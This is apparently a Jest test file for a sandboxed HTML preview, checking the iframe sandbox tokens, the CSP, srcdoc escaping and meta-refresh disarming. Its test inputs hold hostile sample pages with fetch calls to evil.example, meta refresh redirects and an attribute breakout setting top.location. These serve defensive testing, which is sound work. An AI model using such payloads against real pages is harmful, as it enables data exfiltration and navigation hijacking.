import { prepareHtmlRunDocument } from "@/lib/preview/htmlRunDocument";
import { PREVIEW_CSP_LIVE, cspMetaTag } from "@/lib/preview/previewSandbox";

const PAGE = `<!DOCTYPE html><html><head><script>window.user = 1</script></head>
<body><h1 title="a &amp; b">Hi "there"</h1></body></html>`;

const LIVE_CSP_META = cspMetaTag(PREVIEW_CSP_LIVE);

/** The page frame's srcdoc, decoded the way an HTML parser decodes the attribute. */
function pageFrame(doc: string): { sandbox: string[]; page: string } {
  // A raw `"` inside the value would end this match early, so a page that
  // could close the attribute fails the round trip below.
  const frame = /<iframe sandbox="([^"]*)" srcdoc="([^"]*)"><\/iframe>/.exec(doc);
  if (!frame) throw new Error("no sandboxed page frame");
  const page = frame[2].replace(/&quot;/g, '"').replace(/&amp;/g, "&");
  return { sandbox: frame[1].split(/\s+/).filter(Boolean), page };
}

/** The wrapper's own markup: everything but the page in srcdoc. */
function wrapper(doc: string): string {
  return doc.replace(/srcdoc="[^"]*"/, 'srcdoc=""');
}

describe("prepareHtmlRunDocument", () => {
  it("runs the page in a frame that cannot navigate the preview or open windows", () => {
    const doc = prepareHtmlRunDocument(PAGE);
    const { sandbox } = pageFrame(doc);
    expect([...sandbox].sort()).toEqual(["allow-forms", "allow-modals", "allow-scripts"]);
    for (const token of [
      "allow-top-navigation",
      "allow-top-navigation-by-user-activation",
      "allow-top-navigation-to-custom-protocols",
      "allow-popups",
      "allow-popups-to-escape-sandbox",
      "allow-same-origin",
    ]) {
      expect(sandbox).not.toContain(token);
    }
    expect(doc.match(/<iframe\b/g)).toHaveLength(1);
  });

  it("gives the wrapper the live CSP, which the frame inherits", () => {
    // Android never asks the app about the frame's own http(s) navigations;
    // the wrapper's frame-src 'none' is what stops them there.
    const head = /^<!DOCTYPE html><html><head>([\s\S]*?)<\/head>/.exec(
      prepareHtmlRunDocument(PAGE),
    );
    expect(head?.[1]).toContain(LIVE_CSP_META);
    expect(PREVIEW_CSP_LIVE).toContain("frame-src 'none'");
    expect(PREVIEW_CSP_LIVE).toContain("form-action 'none'");
    expect(PREVIEW_CSP_LIVE).toContain("default-src 'none'");
  });

  it.each([
    // The page's own CSP meta lands in <body>, where browsers ignore it.
    [
      "a <head> after <body>",
      '<!DOCTYPE html><html><body><head></head><script>fetch("https://evil.example/?x")</script></body></html>',
    ],
    ["a decoy <head> in <noscript>", '<noscript><head></noscript><html><head></head><body><script>fetch("https://evil.example/")</script></body></html>'],
    ["a decoy <head> in <noframes>", '<noframes><head></noframes><html><head></head><body><img src="https://evil.example/x.png"></body></html>'],
    ["a page with no markup at all", "plain text"],
  ])("keeps the wrapper and its policy the same whatever the page does: %s", (_label, html) => {
    // An inherited policy cannot be removed or moved by the page's markup.
    expect(wrapper(prepareHtmlRunDocument(html))).toBe(wrapper(prepareHtmlRunDocument(PAGE)));
    expect(wrapper(prepareHtmlRunDocument(html))).toContain(LIVE_CSP_META);
  });

  it("keeps the page whole inside srcdoc, so it cannot close the attribute", () => {
    const hostile = `<p>"></iframe><script>top.location = "https://cdn.jsdelivr.net/x.html"</script>&quot;</p>`;
    const doc = prepareHtmlRunDocument(hostile);
    const { page } = pageFrame(doc);
    expect(page).toContain(hostile);
    expect(wrapper(doc)).not.toContain("top.location");
  });

  it("carries none of the location / window.open overrides that never worked", () => {
    // window.location is [LegacyUnforgeable]: redefining href or replacing
    // assign/replace fails silently, so these only looked like protection.
    const doc = prepareHtmlRunDocument(PAGE);
    const page = doc.includes("srcdoc=") ? pageFrame(doc).page : "";
    for (const text of [doc, page]) {
      expect(text).not.toMatch(/defineProperty\(\s*loc/);
      expect(text).not.toMatch(/\.assign\s*=/);
      expect(text).not.toMatch(/\.replace\s*=\s*function/);
      expect(text).not.toMatch(/window\.open\s*=/);
    }
  });

  it("puts the page's CSP and the link trap together ahead of every page script", () => {
    const { page } = pageFrame(prepareHtmlRunDocument(PAGE));
    // First in the document, after its DOCTYPE (injectAtHeadStart, lib/preview/previewSandbox.ts).
    expect(page.startsWith(`<!DOCTYPE html>${LIVE_CSP_META}<script>`)).toBe(true);
    const headAt = page.indexOf(`${LIVE_CSP_META}<script>`);
    const trapAt = page.indexOf('addEventListener("click"');
    const userAt = page.indexOf("window.user = 1");
    expect(headAt).toBeGreaterThan(-1);
    expect(trapAt).toBeGreaterThan(headAt);
    expect(userAt).toBeGreaterThan(trapAt);
    expect(page).toContain('<h1 title="a &amp; b">Hi "there"</h1>');
  });

  it.each([
    '<!-- <meta http-equiv="Content-Security-Policy" content="x"> -->',
    "<!-- <head> -->",
    "<noscript><head></noscript>",
    "<noframes><head></noframes>",
    "<xmp><head></xmp>",
  ])("puts the page's CSP and link trap first, ahead of the decoy %s", (decoy) => {
    // Nothing is searched for, so no decoy can misplace them.
    const html = `${decoy}<html><head></head><body><a href="https://x.example">x</a></body></html>`;
    const { page } = pageFrame(prepareHtmlRunDocument(html));
    expect(
      page.startsWith(`${LIVE_CSP_META}<script>(function () {\n  document.addEventListener("click"`),
    ).toBe(true);
    // Untouched, but for an http-equiv in a decoy comment, disarmed like any other.
    expect(page.replace(/data-blocked-/g, "")).toContain(html);
  });

  it.each([
    '<html><head><meta http-equiv="refresh" content="0;url=https://evil.example/x"></head><body>ok</body></html>',
    // Removing the script before <head> would join the two halves into a live tag.
    '<me<script>x</script>ta http-equiv="refresh" content="0;url=https://evil.example/x"><head></head><body>ok</body>',
  ])("leaves no meta refresh in the page: %s", (html) => {
    const { page } = pageFrame(prepareHtmlRunDocument(html));
    // Disarmed, not removed (lib/preview/htmlMetaPragmas.ts): no <meta> is left whose
    // http-equiv says refresh.
    expect(page).not.toMatch(/<meta\b[^>]*[\s/"']http-equiv\s*=\s*"?refresh/i);
  });

  it("relays the page frame's empty signal through the wrapper", () => {
    // iOS defines window.ReactNativeWebView in the main frame only. Any frame
    // can still post to the app itself; the Run tab acts on this signal alone.
    const doc = prepareHtmlRunDocument(PAGE);
    const { page } = pageFrame(doc);
    expect(page).toContain("parent.postMessage(");
    expect(page).not.toContain("ReactNativeWebView");
    expect(wrapper(doc)).toContain("event.source !== frame.contentWindow");
    expect(wrapper(doc)).toContain("ReactNativeWebView.postMessage(");
  });
});
